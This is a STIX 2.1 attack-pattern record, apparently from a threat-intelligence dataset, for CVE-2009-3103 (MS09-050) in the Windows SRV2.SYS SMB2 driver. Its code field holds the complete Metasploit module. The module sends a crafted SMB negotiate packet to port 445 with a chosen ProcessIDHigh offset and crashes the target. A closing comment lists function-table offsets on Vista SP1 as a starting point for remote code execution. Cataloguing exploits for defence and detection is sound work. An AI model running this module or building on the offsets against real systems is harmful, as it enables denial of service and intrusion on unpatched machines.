{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9547a1e-0129-4210-b16d-4f0a7367edba",
    "created": "2024-08-14T16:25:33.811257Z",
    "modified": "2024-08-14T16:25:33.811261Z",
    "name": "Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference",
    "description": " This module exploits an out of bounds function table dereference in the SMB request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7 release candidates (not RTM), and Windows 2008 Server prior to R2.  Windows\tVista without SP1 does not seem affected by this flaw.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh.rb",
            "external_id": "ms09_050_smb2_negotiate_pidhigh.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3103"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2009/Sep/39"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference',\n      'Description'    => %q{\n        This module exploits an out of bounds function table dereference in the SMB\n      request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7\n      release candidates (not RTM), and Windows 2008 Server prior to R2.  Windows\tVista\n      without SP1 does not seem affected by this flaw.\n      },\n\n      'Author'         => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2009-3103'],\n          ['BID', '36299'],\n          ['OSVDB', '57799'],\n          ['MSB', 'MS09-050'],\n          ['URL', 'https://seclists.org/fulldisclosure/2009/Sep/39']\n        ]\n    ))\n    register_options([\n      Opt::RPORT(445),\n      OptInt.new('OFFSET', [true, 'The function table offset to call', 0xffff])\n    ])\n\n  end\n\n\n  def run\n    connect()\n\n    # The SMB 2 dialect must be there\n    dialects = ['PC NETWORK PROGRAM 1.0', 'LANMAN1.0', 'Windows for Workgroups 3.1a', 'LM1.2X002', 'LANMAN2.1', 'NT LM 0.12', 'SMB 2.002']\n    data     = dialects.collect { |dialect| \"\\x02\" + dialect + \"\\x00\" }.join('')\n\n    pkt = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct\n    pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE\n    pkt['Payload']['SMB'].v['Flags1'] = 0x18\n    pkt['Payload']['SMB'].v['Flags2'] = 0xc853\n    pkt['Payload'].v['Payload']       = data\n\n    pkt['Payload']['SMB'].v['ProcessIDHigh'] = datastore['OFFSET'].to_i\n    pkt['Payload']['SMB'].v['ProcessID']     = 0\n    pkt['Payload']['SMB'].v['MultiplexID']   = rand(0x10000)\n\n    print_status(\"Sending request and waiting for a reply...\")\n    sock.put(pkt.to_s)\n    r = sock.get_once\n\n    if(not r)\n      print_status(\"The target system has likely crashed\")\n    else\n      print_status(\"Response received: #{r.inspect}\")\n    end\n\n    disconnect()\n  end\nend\n\n=begin\n\n  Gaining code execution means pointing the offset to something that\n  eventually causes us to run arbitrary code. The offsets below are\n  a starting point for turning this into remote code execution.\n\n  Offsets on Vista SP1 x64:\n  0x1B = \"SMB 2.002\"\n  0x1D = L\"SMB2Validate\"\n  0x1E = L\"SMB2Execute\"\n  0x31 = move eax, 0x00000002 + ret  # causes a hang when reaced\n  0x58 = WmiQueryTraceInformation\n  0x59 = WmiTraceMessage\n  0x66 = ExAllocatePoolWithTag\n  0x67 = ExFreePool\n  0x76 = ExAllocatePoolWithTag\n  0x77 = ExFreePool\n  0x86 = ExAllocatePoolWithTag\n  0x87 = ExFreePoo\n  0x96 = ExAllocatePoolWithTag\n  0x97 = ExFreePoo\n  0xa6 = ExAllocatePoolWithTag\n  0xa7 = ExFreePoo\n  0xb9 = BugCheckEx\n  0xc7 = SrvBalanceCredits\n  0xdf = SrvNetStatistics data\n  0xe0 = SrvNetStatisticsLock\n  0x010e = SrvSnapShotScaevengerThread\n  0x011c = SrvSnapShotScavengerTimer\n  0x012a = SrvScavengerThread\n  0x0138 = SrvScavengerTimer\n  0x0146 = SrvScavengeDurableHandles\n  0x0157 = SrvScavengeDurableHandlesTimer\n  0x0166 = SrvProcessOplockBreaks\n  0x0179 = SrvProcessOplockBreakTimer\n  0x0185 = L\"XactSrv\"\n  0x01f8 = WppTraceCallback\n\n\n  Offsets on Vista SP1 (no updates) x86:\n\n  0x64 = mov esp, ebp; pop ebp, ret\n  0xde = pool with tag\n\n  0 -> 99b51d6e - 8bff558bec5153568b75088b46308b98\n  1 -> 99b55967 - 8bff558bec51518b45088b48308b8958\n  2 -> 99b53e19 - 8bff558bec568b75088b4e7083791444\n  3 -> 99b55811 - 8bff558bec5151538b5d088b43708378\n  4 -> 99b53d54 - 8bff558bec56578b7d088b4770837814\n  5 -> 99b54d41 - 8bff558bec83ec145356578b7d088b47\n  6 -> 99b54c81 - 8bff558bec518b4d088b816c01000053\n  7 -> 99b66c44 - 8bff558bec518b4d088b816c01000053\n  8 -> 99b655bf - 8bff558bec518b55088b427083781471\n  9 -> 99b63ce4 - 8bff558bec518b4d088b816c01000053\n  10 -> 99b5a221 - 8bff558bec518b4d088b816c01000053\n  11 -> 99b62996 - 8bff558bec518b4d088b816c01000053\n  12 -> 99b5fab5 - 8bff558bec518b4d088b816c01000053\n  25 -> 819aca26 - 6a2468d0988981e8960beeff33d28955\n  26 -> 8186c78b - 8bff558bec83e4f86a008d451c50ff75\n  62 -> 80d40f20 - 0000000000eb45000000000000000000\n  116 -> 819273b7 - 8bff558bec83e4f883ec3c538b5d088b\n  117 -> 8192739f - 8bff558bec6a00ff7508e8df0a00005d\n  166 -> 819273b7 - 8bff558bec83e4f883ec3c538b5d088b\n  167 -> 8192739f - 8bff558bec6a00ff7508e8df0a00005d\n  194 -> 99b6b74c - 8bff558bec83ec0c0fb64d088b451c53\n  195 -> 99b683f0 - 943018c0c6fd3f49a3e8697224f83f6f\n  206 -> 99b5eeb5 - 8bff558bec83ec1ca11094b69953568b\n  217 -> 99b5eea0 - 6a0168809ab699ff151880b699c21000\n  226 -> 99b5211d - 8bff558bec83ec145356578d45f450c6\n  231 -> 8192fcd0 - 0000000014fd9281ffffffff04000000\n  237 -> 99b52108 - 6a0168009bb699ff151880b699c21000\n  382 -> 8b137500 - 000000009075138b0000000000000000\n  491 -> 8599b680 - 894518e82ee2ffff3b45087341ff7520\n  646 -> c000009a - 0000ffffffff80040000ffffffff8004\n  734 -> 802015ff - ffde03f078f8ff7f7c02f8ff3ffe01fe\n  760 -> 99b4ff28 - 8bff558bec6a00ff7514ff7510ff750c\n  804 -> 830ffc7d - 0000001722268b3e012004020010c01c\n\n\n=end\n"
}